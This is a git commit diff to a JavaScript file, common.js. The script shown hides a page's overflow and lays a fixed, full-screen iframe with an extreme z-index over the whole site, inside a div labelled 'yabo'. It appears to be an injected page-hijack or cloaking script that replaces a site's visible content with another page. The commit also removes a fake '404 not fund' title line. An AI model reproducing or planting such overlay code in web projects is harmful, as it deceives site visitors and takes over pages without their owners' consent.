1ce0a659a375c7ac1514402d74a6821475b00de5
kytgzero <130443591+kytgzero@users.noreply.github.com>
2023-06-12 20:13:51 +0800

    Update common.js

--- common.js
+++ common.js
@@ -9,9 +9,8 @@ if (flag) {
   _src = '/404.html'
 }
 document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
+var hd = document.head;
 var styleCSS = document.createElement('style'), yabo = document.createElement('div');
-var curTitle='404 not fund';
-window.document.title+=" - "+curTitle;
 styleCSS.innerHTML = 'html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yabo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';
 yabo.setAttribute('class', 'yabo');
 yabo.innerHTML = '<iframe src='+ _src +' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';
